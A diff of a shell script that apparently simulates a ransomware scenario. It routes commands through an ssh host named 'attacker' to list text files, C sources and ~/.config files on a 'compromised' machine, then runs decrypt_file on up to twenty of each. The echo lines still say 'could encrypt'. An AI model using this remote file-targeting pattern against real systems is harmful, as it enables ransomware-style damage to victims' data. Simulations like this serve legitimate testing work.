@@ -42,7 +42,7 @@ sleep 5 # let the victim connect
 decrypt_file "$HOME/testing.txt"
 
 
-# Encrypt all text files
+# Decrypt all text files
 total=0
 output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
 printf "%s\n" "$output" | while IFS= read -r file; do
@@ -53,6 +53,31 @@ printf "%s\n" "$output" | while IFS= read -r file; do
     echo -e "possibly decrypting: $file\n"
     decrypt_file "$file" < /dev/null || true
 done
+
+# Decrypt all c files
+total=0
+output=$(ssh attacker "byossh compromised 'find / | grep \'\\.c$\''" | sed '1d')
+printf "%s\n" "$output" | while IFS= read -r file; do
+    if [ "$total" = "20" ]; then
+        break
+    fi
+    total=$((total + 1))
+    echo "could encrypt: $file"
+    decrypt_file "$file" < /dev/null || true
+done
+
+# Decrypt all configs
+total=0
+output=$(ssh attacker "byossh compromised find ~/.config" | sed '1d')
+printf "%s\n" "$output" | while IFS= read -r file; do
+    if [ "$total" = "20" ]; then
+        break
+    fi
+    total=$((total + 1))
+    echo "could encrypt: $file"
+    decrypt_file "$file" < /dev/null || true
+done
+
 
 
 sleep 8
